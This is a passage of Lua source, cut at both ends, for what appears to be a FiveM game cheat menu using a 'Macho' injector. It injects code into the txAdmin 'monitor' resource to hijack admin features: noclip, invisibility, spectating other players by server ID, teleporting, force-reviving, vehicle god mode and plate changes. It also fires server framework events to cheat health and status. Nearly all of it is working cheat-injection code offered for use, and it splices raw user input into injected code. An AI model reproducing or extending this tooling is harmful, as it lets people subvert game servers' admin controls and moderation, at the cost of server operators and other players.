                                local fast = IsDisabledControlPressed(0, 21) -- LSHIFT
                                local slow = IsDisabledControlPressed(0, 19) -- LCTRL
                                local speedMultiplier = 0.5 -- Base speed
                                if fast then speedMultiplier = 2.5 end
                                if slow then speedMultiplier = 0.1 end

                                local lookX, lookY = GetDisabledControlNormal(0, 1), GetDisabledControlNormal(0, 2)
                                _G._internal_rot = vector3(math.max(math.min(_G._internal_rot.x + (-lookY * 5), 90.0), -90.0), 0.0, _G._internal_rot.z + (-lookX * 5))
                               
                                local radX, radZ = math.rad(_G._internal_rot.x), math.rad(_G._internal_rot.z)
                                local cosX = math.abs(math.cos(radX))
                                local dir = vector3(-math.sin(radZ) * cosX, math.cos(radZ) * cosX, math.sin(radX))
                                local sideDir = vector3(-math.cos(radZ), -math.sin(radZ), 0.0)

                                if IsDisabledControlPressed(0, 32) then _G._internal_pos = _G._internal_pos + (dir * speedMultiplier) end -- W
                                if IsDisabledControlPressed(0, 33) then _G._internal_pos = _G._internal_pos - (dir * speedMultiplier) end -- S
                                if IsDisabledControlPressed(0, 34) then _G._internal_pos = _G._internal_pos + (sideDir * speedMultiplier) end -- A
                                if IsDisabledControlPressed(0, 35) then _G._internal_pos = _G._internal_pos - (sideDir * speedMultiplier) end -- D
                                
                                if IsDisabledControlPressed(0, 152) then -- Q
                                    _G._internal_pos = _G._internal_pos + vector3(0, 0, speedMultiplier)
                                end
                                if IsDisabledControlPressed(0, 153) then -- E
                                    _G._internal_pos = _G._internal_pos - vector3(0, 0, speedMultiplier)
                                end

                                SetCamCoord(_G._internal_camera, _G._internal_pos.x, _G._internal_pos.y, _G._internal_pos.z)
                                SetCamRot(_G._internal_camera, _G._internal_rot.x, _G._internal_rot.y, _G._internal_rot.z, 2)
                                SetEntityCoordsNoOffset(ped, _G._internal_pos.x, _G._internal_pos.y, _G._internal_pos.z, false, false, false)
                                DrawScaleformMovieFullscreen(sf, 255, 255, 255, 255, 0)
                                
                                DisableControlAction(0, 30, true) -- Move LR
                                DisableControlAction(0, 31, true) -- Move UD
                                Wait(0)
                            end
                            
                            RenderScriptCams(false, true, 250, true, true)
                            DestroyCam(_G._internal_camera)
                            SetEntityVisible(ped, true, false)
                            SetEntityInvincible(ped, false)
                            FreezeEntityPosition(ped, false)
                            _G.clearPersistentAlert('noClipEnabled')
                        end)
                    end
                end
                _G.txFunctionsLoaded = true
            end

            
            Citizen.CreateThread(function()
                while _G.txNoClipMaster do
                    if IsDisabledControlJustPressed(0, 74) or IsControlJustPressed(0, 74) then
                        _G.noClipEnabled = not _G.noClipEnabled
                        _G.SetFreecamActive(_G.noClipEnabled)
                    end
                    Wait(5)
                end
            end)
        ]])
    end,


    function()
        MachoInjectResource("monitor", [[
            _G.txNoClipMaster = false
            _G.noClipEnabled = false
        ]])
    end
)

MachoMenuCheckbox(Tab1Group2, "Toggle TxAdmin ID", 

    function()
        MachoInjectResource('monitor', [[
            _G.TxIdsActive = true 
            _G.PlayerGamerTags = _G.PlayerGamerTags or {}

            local function CleanTags()
                for pid, data in pairs(_G.PlayerGamerTags) do
                    if IsMpGamerTagActive(data.gamerTag) then
                        RemoveMpGamerTag(data.gamerTag)
                    end
                end
                _G.PlayerGamerTags = {}
            end

            sendSnackbarMessage('info', 'nui_menu.page_main.player_ids.alert_show', true)

            Citizen.CreateThread(function()
                while _G.TxIdsActive do
                    local curCoords = GetEntityCoords(PlayerPedId())
                    local distanceToCheck = GetConvarInt('txAdmin-menuPlayerIdDistance', 150)

                    for _, pid in ipairs(GetActivePlayers()) do
                        local targetPed = GetPlayerPed(pid)
                        if DoesEntityExist(targetPed) then
                            if not _G.PlayerGamerTags[pid] or _G.PlayerGamerTags[pid].ped ~= targetPed or not IsMpGamerTagActive(_G.PlayerGamerTags[pid].gamerTag) then
                                local playerName = string.sub(GetPlayerName(pid) or "unknown", 1, 75)
                                local playerStr = '[' .. GetPlayerServerId(pid) .. ']' .. ' ' .. playerName
                                
                                _G.PlayerGamerTags[pid] = {
                                    gamerTag = CreateFakeMpGamerTag(targetPed, playerStr, false, false, 0),
                                    ped = targetPed
                                }
                            end

                            local tag = _G.PlayerGamerTags[pid].gamerTag
                            if #(GetEntityCoords(targetPed) - curCoords) <= distanceToCheck then
                                SetMpGamerTagVisibility(tag, 0, true) 
                                SetMpGamerTagVisibility(tag, 2, true) 
                                SetMpGamerTagAlpha(tag, 2, 255)
                                
                                SetMpGamerTagHealthBarColor(tag, 129) 
                                SetMpGamerTagColour(tag, 0, 0) 

                                if NetworkIsPlayerTalking(pid) then
                                    SetMpGamerTagVisibility(tag, 4, true)
                                    SetMpGamerTagColour(tag, 0, 12) 
                                else
                                    SetMpGamerTagVisibility(tag, 4, false)
                                    SetMpGamerTagColour(tag, 0, 0)
                                end
                            else
                                SetMpGamerTagVisibility(tag, 0, false)
                                SetMpGamerTagVisibility(tag, 2, false)
                                SetMpGamerTagVisibility(tag, 4, false)
                            end
                        end
                    end
                    Wait(250)
                end
                CleanTags()
            end)
        ]])
    end,

    function()
        MachoInjectResource('monitor', [[
            _G.TxIdsActive = false
            sendSnackbarMessage('info', 'nui_menu.page_main.player_ids.alert_hide', true)
            
        ]])
    end
)



MachoMenuCheckbox(Tab1Group2, "Invisible", 
    function()
        MachoMenuNotification("Invisibility", "Character is now INVISIBLE")
        local ped = PlayerPedId()
        SetEntityVisible(ped, false, false) 
    end,

    function()
        MachoMenuNotification("Invisibility", "Character is now VISIBLE")
        local ped = PlayerPedId()
        SetEntityVisible(ped, true, false)
    end
)


local SpectateIDInput = MachoMenuInputbox(Tab1Group2, "Enter Player Server ID", "e.g., 12")

MachoMenuButton(Tab1Group2, "Start Spectate Player", function()
    local targetId = MachoMenuGetInputbox(SpectateIDInput)
    if not targetId or targetId == "" then return end

    MachoInjectResource("monitor", string.format([[
        local isSpectateEnabled = false
        local spectatorReturnCoords = nil
        local targetServerId = %s

        local function sendTxNotif(type, msg)
            SendNUIMessage({action = 'showSnackbar', data = {type = type, message = msg, isTranslationKey = false}})
        end

        function makeSimpleScaleform()
            local scaleform = RequestScaleformMovie("INSTRUCTIONAL_BUTTONS")
            while not HasScaleformMovieLoaded(scaleform) do Wait(0) end
            PushScaleformMovieFunction(scaleform, "CLEAR_ALL")
            PopScaleformMovieFunctionVoid()
            
            -- Exit lang ang button (Backspace/ESC)
            PushScaleformMovieFunction(scaleform, "SET_DATA_SLOT")
            PushScaleformMovieFunctionParameterInt(0)
            PushScaleformMovieMethodParameterButtonName(GetControlInstructionalButton(0, 194, true))
            PushScaleformMovieMethodParameterString("Exit Spectate")
            PopScaleformMovieFunctionVoid()

            PushScaleformMovieFunction(scaleform, "DRAW_INSTRUCTIONAL_BUTTONS")
            PopScaleformMovieFunctionVoid()
            return scaleform
        end

        function stopSpectate()
            isSpectateEnabled = false
            DoScreenFadeOut(500)
            Wait(500)
            local ped = PlayerPedId()
            NetworkSetInSpectatorMode(false, nil)
            if spectatorReturnCoords then
                SetEntityCoords(ped, spectatorReturnCoords.x, spectatorReturnCoords.y, spectatorReturnCoords.z)
            end
            FreezeEntityPosition(ped, false)
            SetEntityVisible(ped, true, 0)
            SetEntityInvincible(ped, false)
            SetEntityCollision(ped, true, true)
            spectatorReturnCoords = nil
            DoScreenFadeIn(500)
            sendTxNotif('info', 'Spectate Stopped')
        end

        local targetPlayer = GetPlayerFromServerId(targetServerId)
        local targetPed = GetPlayerPed(targetPlayer)
        local myCoords = GetEntityCoords(PlayerPedId())
        local targetCoords = GetEntityCoords(targetPed)
        local distance = #(myCoords - targetCoords)

        if targetPlayer == -1 or not DoesEntityExist(targetPed) or distance > 400.0 then
            sendTxNotif('error', 'Error: Player too far (>400m) or not rendered!')
            return 
        end

        Citizen.CreateThread(function()
            local ped = PlayerPedId()
            spectatorReturnCoords = GetEntityCoords(ped)
            
            DoScreenFadeOut(500)
            Wait(500)
            
            FreezeEntityPosition(ped, true)
            SetEntityVisible(ped, false, 0)
            SetEntityInvincible(ped, true)
            SetEntityCollision(ped, false, false)

            NetworkSetInSpectatorMode(true, targetPed)
            isSpectateEnabled = true
            DoScreenFadeIn(500)
            sendTxNotif('success', 'Spectating ID ' .. targetServerId)
            
            local sf = makeSimpleScaleform()
            while isSpectateEnabled do
                local currentPed = GetPlayerPed(GetPlayerFromServerId(targetServerId))
                if DoesEntityExist(currentPed) then
                    local c = GetEntityCoords(currentPed)
                    SetEntityCoordsNoOffset(ped, c.x, c.y, c.z - 15.0, false, false, false)
                else
                    stopSpectate()
                end

                if IsControlJustPressed(0, 194) then stopSpectate() end
                DrawScaleformMovieFullscreen(sf, 255, 255, 255, 255, 0)
                Wait(0)
            end
        end)
    ]], targetId))
end)




local VectorInputBox = MachoMenuInputbox(Tab1Group2, "Enter Vector3 (x, y, z)", "0.0, 0.0, 0.0")

MachoMenuButton(Tab1Group2, "Teleport to Vector", function()
    local rawInput = MachoMenuGetInputbox(VectorInputBox)
    
    if not rawInput or rawInput == "" or rawInput == "..." then
        MachoMenuNotification("Teleport Error", "Input box is empty!")
        return
    end

    MachoInjectResource("monitor", [[
        local rawText = "]] .. rawInput .. [["
        local coords = {}
        for num in rawText:gmatch("-?%d+%.?%d*") do
            table.insert(coords, tonumber(num))
        end

        if #coords >= 3 then
            local tx, ty, tz = coords[1], coords[2], coords[3]
            local ped = PlayerPedId()
            local entity = IsPedInAnyVehicle(ped, false) and GetVehiclePedIsIn(ped, false) or ped

            DoScreenFadeOut(200)
            while not IsScreenFadedOut() do Wait(0) end
            
            FreezeEntityPosition(entity, true)

            local groundFound = false
            local posZ = tz

            SetEntityCoordsNoOffset(entity, tx, ty, 800.0, false, false, false)
            Wait(500) 

            for i = 950, 0, -50 do
                SetEntityCoordsNoOffset(entity, tx, ty, ToFloat(i), false, false, false)
                Wait(0)
                local found, z = GetGroundZFor_3dCoord(tx, ty, ToFloat(i), 0)
                if found then
                    posZ = z + 1.0 
                    groundFound = true
                    break
                end
            end
            SetEntityCoordsNoOffset(entity, tx, ty, posZ, false, false, true)
            FreezeEntityPosition(entity, false)
            
            if IsPedInAnyVehicle(ped, false) then
                SetVehicleOnGroundProperly(entity)
            end

            DoScreenFadeIn(500)
        end
    ]])
    MachoMenuNotification("Teleport", "Teleporting To Vec3")
end)


MachoMenuButton(Tab1Group2, "Get Current Vector (F8)", function()
  
    if MachoResourceInjectable("monitor") then
        MachoInjectResource("monitor", [[
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local heading = GetEntityHeading(ped)

            local x = math.floor(coords.x * 100) / 100
            local y = math.floor(coords.y * 100) / 100
            local z = math.floor(coords.z * 100) / 100
            local h = math.floor(heading * 100) / 100

            print("---------------------------------------")
            print("^2[VECTOR GENERATOR]^7")
            print(string.format("^3Vector3:^7 vector3(%.2f, %.2f, %.2f)", x, y, z))
            print(string.format("^3Vector4:^7 vector4(%.2f, %.2f, %.2f, %.2f)", x, y, z, h))
            print(string.format("^3Table:^7 {x = %.2f, y = %.2f, z = %.2f}", x, y, z))
            print("---------------------------------------")
        ]])
    else
        print("^1[Esse]^7 Target resource 'monitor' not found.")
    end
end)


local specialKeys = {
    [8] = "BACK", [9] = "TAB", [13] = "ENT", [16] = "SHFT", [17] = "CTRL", [18] = "ALT",
    [27] = "ESC", [32] = "SPC", [33] = "PGUP", [34] = "PGDN", [35] = "END", [36] = "HOME", 
    [37] = "LFT", [38] = "UP", [39] = "RGT", [40] = "DWN", [45] = "INS", [46] = "DEL", 
    [112] = "F1", [113] = "F2", [114] = "F3", [115] = "F4", [116] = "F5", [117] = "F6", 
    [118] = "F7", [119] = "F8", [120] = "F9", [121] = "F10", [122] = "F11", [123] = "F12"
}
local function GetNoclipKeyName(code)
    if specialKeys[code] then return specialKeys[code] end
    if code >= 32 and code <= 126 then return string.char(code):upper() end
    return "KEY " .. tostring(code)
end

local noclipMasterPower = false 
local noclipActive = false      
local currentNoclipKey = 69     
local isListeningNoclip = false
local currentSliderValue = 0 
local baseSpeed = 1.0

local function GetCalculatedSpeed()
    return baseSpeed + currentSliderValue
end


MachoMenuCheckbox(Tab1Group1, "Enable Noclip", function()
    noclipMasterPower = true 
    MachoInjectResource2(1,"monitor", string.format("_G.MachoNoclipSpeed = %f", GetCalculatedSpeed()))
    MachoMenuNotification("Noclip", "No-Clip: ON")
end, function()
    noclipMasterPower = false
    MachoMenuNotification("Noclip", "No-Clip: OFF")
    if noclipActive then noclipActive = false RunNoclip(false) end 
end)

MachoMenuSlider(Tab1Group1, "Noclip Speed", 1, 0, 100, "%", currentSliderValue, function(Value)
    currentSliderValue = Value
    MachoInjectResource2(1,"monitor", string.format("_G.MachoNoclipSpeed = %f", GetCalculatedSpeed()))
end)

local NoclipBtn = MachoMenuButton(Tab1Group1, "Noclip Key : " .. GetNoclipKeyName(currentNoclipKey), function()
    isListeningNoclip = true
    MachoMenuSetText(NoclipBtn, "PRESS ANY KEY")
end)

MachoOnKeyDown(function(keyCode)
    if isListeningNoclip then
        currentNoclipKey = keyCode
        isListeningNoclip = false
        MachoMenuSetText(NoclipBtn, "Noclip Key : " .. GetNoclipKeyName(keyCode))
        return 
    end

    if noclipMasterPower and keyCode == currentNoclipKey then
        noclipActive = not noclipActive
        local totalSpeed = GetCalculatedSpeed()
        
        MachoInjectResource2(1,"monitor", string.format([[
            _G.MachoNoclipSpeed = %f
            noclipSpeed = %f
        ]], totalSpeed, totalSpeed))
        
        RunNoclip(noclipActive)
    end
end)


local specialKeys = {
    [8] = "BACK", [9] = "TAB", [13] = "ENT", [16] = "SHFT", [17] = "CTRL", [18] = "ALT",
    [27] = "ESC", [32] = "SPC", [33] = "PGUP", [34] = "PGDN", [35] = "END", [36] = "HOME", 
    [37] = "LFT", [38] = "UP", [39] = "RGT", [40] = "DWN", [45] = "INS", [46] = "DEL", 
    [112] = "F1", [113] = "F2", [114] = "F3", [115] = "F4", [116] = "F5", [117] = "F6", 
    [118] = "F7", [119] = "F8", [120] = "F9", [121] = "F10", [122] = "F11", [123] = "F12"
}

local noclipMasterPower = false 
local noclipActive = false      
local currentNoclipKey = 69 
local isListeningNoclip = false
local currentSliderValue = 10 

MachoInjectResource2(1,"monitor", "_G.MachoSliderVal = 10")

local function GetNoclipKeyName(code)
    if specialKeys[code] then return specialKeys[code] end
    if code >= 32 and code <= 126 then return string.char(code):upper() end
    return "KEY " .. tostring(code)
end

local function RunNoclip(enable)
    if enable then
        MachoInjectResource("monitor", "ButterflyActive = false")
        Wait(50)
        
        local code = [[
            ButterflyActive = true
            Citizen.CreateThread(function()
                local p = PlayerPedId()
                
                while ButterflyActive do
                    Citizen.Wait(0)
                    local ent = IsPedInAnyVehicle(p, false) and GetVehiclePedIsIn(p, false) or p
                    local rot = GetGameplayCamRot(2)
                    SetPedComponentVariation(p, 5, 0, 0, 0)
                    SetEntityCollision(ent, false, false)
                    SetEntityAlpha(ent, 150, false) 
                    SetEntityInvincible(ent, true)
                    FreezeEntityPosition(ent, false)

                    if not IsPedInParachuteFreeFall(p) then
                        TaskSkyDive(p) 
                    end
                    
                    local sVal = _G.MachoSliderVal or 0
                
                    local baseSpeed = 100.0 + (sVal * 2.0)
                    
                    local speed = IsControlPressed(0, 21) and (baseSpeed * 2.5) or baseSpeed 
                    local vx, vy, vz = 0.0, 0.0, 0.0

                    if IsControlPressed(0, 32) then -- W
                        vx = vx + (-math.sin(math.rad(rot.z)) * speed)
                        vy = vy + (math.cos(math.rad(rot.z)) * speed)
                        vz = vz + (math.sin(math.rad(rot.x)) * speed)
                    end

                    if IsControlPressed(0, 31) then -- S
                        vx = vx - (-math.sin(math.rad(rot.z)) * speed)
                        vy = vy - (math.cos(math.rad(rot.z)) * speed)
                        vz = vz - (math.sin(math.rad(rot.x)) * speed)
                    end

                    if IsControlPressed(0, 34) then -- A
                        vx = vx + (-math.cos(math.rad(rot.z)) * (speed * 0.7))
                        vy = vy + (-math.sin(math.rad(rot.z)) * (speed * 0.7))
                    end

                    if IsControlPressed(0, 35) then -- D
                        vx = vx + (math.cos(math.rad(rot.z)) * (speed * 0.7))
                        vy = vy + (math.sin(rot.z * 0.0174533) * (speed * 0.7))
                    end

                    SetEntityVelocity(ent, vx, vy, vz)
                    SetEntityHeading(ent, rot.z)
                end

                local p_end = PlayerPedId()
                local ent_end = IsPedInAnyVehicle(p_end, false) and GetVehiclePedIsIn(p_end, false) or p_end
                ResetEntityAlpha(ent_end)
                SetEntityCollision(ent_end, true, true)
                SetEntityInvincible(p_end, false)
                ClearPedTasksImmediately(p_end)
            end)
        ]]
        MachoInjectResource2(1, "monitor", code)
    else
        MachoInjectResource("monitor", "ButterflyActive = false")
    end
end


MachoMenuCheckbox(Tab1Group1, "Butterfly noclip", function()
    noclipMasterPower = true 
    MachoInjectResource("monitor", string.format("_G.MachoSliderVal = %d", currentSliderValue))
end, function()
    noclipMasterPower = false
    if noclipActive then noclipActive = false RunNoclip(false) end
end)

MachoMenuSlider(Tab1Group1, "Noclip Speed", 1, 0, 100, "%", currentSliderValue, function(Value)
    currentSliderValue = Value
    MachoInjectResource("monitor", string.format("_G.MachoSliderVal = %d", currentSliderValue))
end)

local NoclipBtn = MachoMenuButton(Tab1Group1, "Noclip Key : " .. GetNoclipKeyName(currentNoclipKey), function()
    isListeningNoclip = true
    MachoMenuSetText(NoclipBtn, "PRESS ANY KEY")
end)

MachoOnKeyDown(function(keyCode)
    if isListeningNoclip then
        currentNoclipKey = keyCode
        isListeningNoclip = false
        MachoMenuSetText(NoclipBtn, "Noclip Key : " .. GetNoclipKeyName(keyCode))
        return 
    end

    if noclipMasterPower and keyCode == currentNoclipKey then
        noclipActive = not noclipActive
        RunNoclip(noclipActive)
    end
end)


MachoMenuText(Tab1Group1, "Force Revive")

MachoMenuButton(Tab1Group1, "Universal Force Revive", function()
    MachoInjectResource2(3, "any", [[
        local myPed = PlayerPedId()
        local coords = GetEntityCoords(myPed)
        local heading = GetEntityHeading(myPed)

        NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
        
        SetEntityHealth(myPed, 200)
        ClearPedBloodDamage(myPed)

        ResurrectPed(myPed)
        ClearPedTasksImmediately(myPed)
 
        isDead = false
        InLastStand = false
        exports['qbx_medical']:SetDeathStatus(false)
    ]])
    MachoMenuNotification("Macho Inject", "Universal Force Revive Executed")
end)


MachoMenuText(Tab1Group1, "Deafult Revive / Status")

MachoMenuButton(Tab1Group1, "Revive (CFX)", function()
    TriggerEvent('cfx-xfx-ambulance:revive')
    MachoMenuNotification("Macho Inject", "Resources: Reviving via CFX...")
end)

MachoMenuButton(Tab1Group1, "Revive (ESX)", function()
    TriggerEvent('esx_ambulancejob:revive')
    MachoMenuNotification("Macho Inject", "Resources: Reviving via ESX...")
end)

MachoMenuButton(Tab1Group1, "Revive (QB)", function()
    TriggerEvent('hospital:client:Revive')
    MachoMenuNotification("Macho Inject", "Resources: Reviving via QB-Core...")
end)

MachoMenuButton(Tab1Group1, "Revive (QBX)", function()
    TriggerEvent('qbx_medical:client:playerRevived')
    TriggerEvent('hospital:client:Revive') 
    MachoMenuNotification("Macho Inject", "Resources: Reviving via QBX...")
end)

MachoMenuButton(Tab1Group1, "Add Armor", function()
    SetPedArmour(PlayerPedId(), 100)
    MachoMenuNotification("Enhancement", "Armor Restored")
end)

MachoMenuButton(Tab1Group1, "Heal", function()
    SetEntityHealth(PlayerPedId(), GetEntityMaxHealth(PlayerPedId()))
    MachoMenuNotification("Enhancement", "Health Restored")
end)

MachoMenuText(Tab1Group1, "CFX")

MachoMenuButton(Tab1Group1, "Add Hunger (CFX)", function()
    TriggerEvent('cfx-xfx-status:add', 'hunger', 100)
    MachoMenuNotification("Status Update", "Hunger Restored (CFX)")
end)
MachoMenuButton(Tab1Group1, "Add Thirst (CFX)", function()
    TriggerEvent('cfx-xfx-status:add', 'thirst', 100)
    MachoMenuNotification("Status Update", "Thirst Restored (CFX)")
end)
MachoMenuButton(Tab1Group1, "Remove Stress (CFX)", function()
    TriggerEvent('cfx-xfx-status:remove', 'stress', 100)
    MachoMenuNotification("Status Update", "Stress Removed (CFX)")
end)

---

MachoMenuText(Tab1Group1, "ESX")

MachoMenuButton(Tab1Group1, "Add Hunger (ESX)", function()
    TriggerEvent('esx_status:add', 'hunger', 100000)
    MachoMenuNotification("Status Update", "Hunger Restored (ESX)")
end)
MachoMenuButton(Tab1Group1, "Add Thirst (ESX)", function()
    TriggerEvent('esx_status:add', 'thirst', 100000)
    MachoMenuNotification("Status Update", "Thirst Restored (ESX)")
end)
MachoMenuButton(Tab1Group1, "Remove Stress (ESX)", function()
    TriggerEvent('esx_status:remove', 'stress', 100000)
    MachoMenuNotification("Status Update", "Stress Removed (ESX)")
end)

---

MachoMenuText(Tab1Group1, "QB-core")

MachoMenuButton(Tab1Group1, "Add Hunger (QB)", function()
    TriggerEvent('consumables:client:Eat', 100)
    MachoMenuNotification("Status Update", "Hunger Restored (QB)")
end)

MachoMenuButton(Tab1Group1, "Add Thirst (QB)", function()
    TriggerEvent('consumables:client:Drink', 100)
    MachoMenuNotification("Status Update", "Thirst Restored (QB)")
end)

MachoMenuButton(Tab1Group1, "Remove Stress (QB)", function()
    TriggerEvent('hud:client:RelieveStress', 100)
    MachoMenuNotification("Status Update", "Stress Removed (QB)")
end)

---

MachoMenuText(Tab1Group1, "Qbox / QBX")

MachoMenuButton(Tab1Group1, "Add Hunger (QBX)", function()
    TriggerEvent('qbx_core:client:setMeta', 'hunger', 100)
    MachoMenuNotification("Status Update", "Hunger Restored (QBX)")
end)

MachoMenuButton(Tab1Group1, "Add Thirst (QBX)", function()
    TriggerEvent('qbx_core:client:setMeta', 'thirst', 100)
    MachoMenuNotification("Status Update", "Thirst Restored (QBX)")
end)

MachoMenuButton(Tab1Group1, "Remove Stress (QBX)", function()
    TriggerEvent('qbx_core:client:setMeta', 'stress', 0)
    MachoMenuNotification("Status Update", "Stress Removed (QBX)")
end)




MachoMenuText(Tab1Group1, "Other Stuff")


 
MachoMenuButton(Tab1Group1, "Tp to Waypoint", function()
    local waypoint = GetFirstBlipInfoId(8)
    
    if DoesBlipExist(waypoint) then
        local coords = GetBlipInfoIdCoord(waypoint)
        MachoMenuNotification("Teleport", "Teleporting to Waypoint...")
        MachoInjectResource("monitor", string.format([[
            Citizen.CreateThread(function()
                local entity = PlayerPedId()
                if IsPedInAnyVehicle(entity, false) then
                    entity = GetVehiclePedIsIn(entity, false)
                end

                local tx, ty = %f, %f
                local groundFound = false
                local posZ = 0.0

                FreezeEntityPosition(entity, true)
                
                SetEntityCoordsNoOffset(entity, tx, ty, 800.0, false, false, false)
                Wait(500) 

                for i = 950, 0, -50 do
                    SetEntityCoordsNoOffset(entity, tx, ty, i + 0.0, false, false, false)
                    Wait(0)
                    local found, z = GetGroundZFor_3dCoord(tx, ty, i + 0.0, 0)
                    if found then
                        posZ = z + 1.0 
                        groundFound = true
                        break
                    end
                end

                if groundFound then
                    SetEntityCoordsNoOffset(entity, tx, ty, posZ, false, false, true)
                    if IsPedInAnyVehicle(PlayerPedId(), false) then
                        SetVehicleOnGroundProperly(entity)
                    end
                else
                    SetEntityCoordsNoOffset(entity, tx, ty, 100.0, false, false, true)
                end

                FreezeEntityPosition(entity, false)
            end)
        ]], coords.x, coords.y))
    else
        MachoMenuNotification("Teleport Error", "Set a Waypoint first!")
    end
end)







Tab2Button = MachoMenuAddTab(TabbedWindow, "Vehicle")

Tab2Group1 = MachoMenuGroup(Tab2Button, "Vehicle Things", TabsWidth+GroupGap, GroupTopGap+WindowTopBar, TabsWidth+GroupGap+GroupSize, 500-GroupTopGap)
Tab2Group2 = MachoMenuGroup(Tab2Button, "Vehicle Settings", TabsWidth+GroupGap+GroupSize+GroupGap, GroupTopGap+WindowTopBar, TabsWidth+GroupGap+GroupSize+GroupGap+GroupSize, 500-GroupTopGap)


local GlobalTargetInput = MachoMenuInputbox(Tab2Group2, "Target Server ID")
local function GetTargetID()
    local input = MachoMenuGetInputbox(GlobalTargetInput)
    local target = tonumber(input)
    if not target or target == "" then
        return GetPlayerServerId(PlayerId()) 
    end
    return target
end



  
local PlateInputBox = MachoMenuInputbox(Tab2Group1, "Enter New Plate", "...")

MachoMenuButton(Tab2Group1, "Change License Plate", function()
    
    local newPlate = MachoMenuGetInputbox(PlateInputBox)
    
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0

    if newPlate == "..." or newPlate == "" then
        MachoMenuNotification("Error", "Please enter a plate name first!")
        return
    end

    MachoInjectResource2(3, "monitor", string.format([[
        local plateText = "%s"
        local selVeh = %d
        local playerPed = PlayerPedId()
        local targetVeh = 0

       
        if selVeh ~= 0 and DoesEntityExist(selVeh) then
            targetVeh = selVeh
        elseif IsPedInAnyVehicle(playerPed, false) then
            targetVeh = GetVehiclePedIsIn(playerPed, false)
        end

        if targetVeh ~= 0 and DoesEntityExist(targetVeh) then
            NetworkRequestControlOfEntity(targetVeh)
            SetVehicleNumberPlateText(targetVeh, plateText)
        end
    ]], newPlate, selectedVeh))

    MachoMenuNotification("Plate", "Changed to: " .. newPlate)
end)

local vehicleGodEnabled = false

MachoMenuCheckbox(Tab2Group1, "Vehicle God Mode", 
    function()
        vehicleGodEnabled = true
        local selectedVeh = MachoMenuGetSelectedVehicle() or 0

        MachoInjectResource2(3, "monitor", string.format([[
            _G.MachoVehGod = true
            local selVeh = %d

            Citizen.CreateThread(function()
                while _G.MachoVehGod do
                    Citizen.Wait(100) 
                    local ped = PlayerPedId()
                    local vehicle = 0

                    if selVeh ~= 0 and DoesEntityExist(selVeh) then
                        vehicle = selVeh
                    elseif IsPedInAnyVehicle(ped, false) then
                        vehicle = GetVehiclePedIsIn(ped, false)
                    end

                    if vehicle ~= 0 and DoesEntityExist(vehicle) then
                        SetEntityInvincible(vehicle, true)
                        SetVehicleTyresCanBurst(vehicle, false)
                        SetVehicleCanBreak(vehicle, false)
                        SetEntityProofs(vehicle, true, true, true, true, true, true, true, true)
                        SetVehicleExplodesOnHighExplosionDamage(vehicle, false)
                        SetVehicleStrong(vehicle, true)
                        SetVehicleHasStrongAxles(vehicle, true)

                        if GetVehicleBodyHealth(vehicle) < 1000.0 or GetVehicleEngineHealth(vehicle) < 1000.0 then
                            SetVehicleBodyHealth(vehicle, 1000.0)
                            SetVehicleEngineHealth(vehicle, 1000.0)
                            SetVehicleFixed(vehicle)
                            SetVehicleDirtLevel(vehicle, 0.0)
                        end
                    end
                end
            end)
        ]], selectedVeh))
    end,
    function()
        vehicleGodEnabled = false
        MachoInjectResource2(3, "any", [[
            _G.MachoVehGod = false
            local ped = PlayerPedId()
            local vehicle = GetVehiclePedIsIn(ped, false)
            if vehicle ~= 0 and DoesEntityExist(vehicle) then
                SetEntityInvincible(vehicle, false)
                SetVehicleTyresCanBurst(vehicle, true)
                SetEntityProofs(vehicle, false, false, false, false, false, false, false, false)
                SetVehicleCanBreak(vehicle, true)
            end
        ]])
    end
)




MachoMenuCheckbox(Tab2Group1, "Rainbow Underglow",
    function()
        rainbowUnderglowActive = true
        local selectedVeh = MachoMenuGetSelectedVehicle() or 0

        MachoInjectResource2(3, "any", string.format([[
            local function HSVToRGB(h, s, v)
                local r, g, b
                local i = math.floor(h * 6)
                local f = h * 6 - i
                local p = v * (1 - s)
                local q = v * (1 - f * s)
                local t = v * (1 - (1 - f) * s)
                i = i %% 6 
                if i == 0 then r, g, b = v, t, p
                elseif i == 1 then r, g, b = q, v, p
                elseif i == 2 then r, g, b = p, v, t
                elseif i == 3 then r, g, b = p, q, v
                elseif i == 4 then r, g, b = t, p, v
                elseif i == 5 then r, g, b = v, p, q
                end
                return math.floor(r * 255), math.floor(g * 255), math.floor(b * 255)
            end

            _G.MachoUnderglowLoop = true
            local selVeh = %d

            Citizen.CreateThread(function()
                local hue = 0
                while _G.MachoUnderglowLoop do
                    Citizen.Wait(10)
                    local vehicle = 0
                    local ped = PlayerPedId()

                    if selVeh ~= 0 and DoesEntityExist(selVeh) then
                        vehicle = selVeh
                    elseif IsPedInAnyVehicle(ped, false) then
                        vehicle = GetVehiclePedIsIn(ped, false)
                    end

                    if vehicle ~= 0 and DoesEntityExist(vehicle) then
                        hue = (hue + 1) %% 360 
                        local r, g, b = HSVToRGB(hue / 360, 1.0, 1.0)
                        
                        for i = 0, 3 do
                            if not IsVehicleNeonLightEnabled(vehicle, i) then
                                SetVehicleNeonLightEnabled(vehicle, i, true)
                            end
                        end
                        SetVehicleNeonLightsColour(vehicle, r, g, b)
                    else
                        Citizen.Wait(500)
                    end
                end
            end)
        ]], selectedVeh))
    end,
    function()
        rainbowUnderglowActive = false
        MachoInjectResource2(3, "any", [[ _G.MachoUnderglowLoop = false ]])
    end
)


local rainbowPaintActive = false

MachoMenuCheckbox(Tab2Group1, "Rainbow Paint",
    function()
        rainbowPaintActive = true
        local selectedVeh = MachoMenuGetSelectedVehicle() or 0

        MachoInjectResource2(3, "any", string.format([[
            local function HSVToRGB(h, s, v)
                local r, g, b
                local i = math.floor(h * 6)
                local f = h * 6 - i
                local p = v * (1 - s)
                local q = v * (1 - f * s)
                local t = v * (1 - (1 - f) * s)
                i = i %% 6 
                if i == 0 then r, g, b = v, t, p
                elseif i == 1 then r, g, b = q, v, p
                elseif i == 2 then r, g, b = p, v, t
                elseif i == 3 then r, g, b = p, q, v
                elseif i == 4 then r, g, b = t, p, v
                elseif i == 5 then r, g, b = v, p, q
                end
                return math.floor(r * 255), math.floor(g * 255), math.floor(b * 255)
            end

            _G.MachoPaintLoop = true
            local selVeh = %d

            Citizen.CreateThread(function()
                local hue = 0
                while _G.MachoPaintLoop do
                    Citizen.Wait(20) 
                    local vehicle = 0
                    local ped = PlayerPedId()

                    if selVeh ~= 0 and DoesEntityExist(selVeh) then
                        vehicle = selVeh
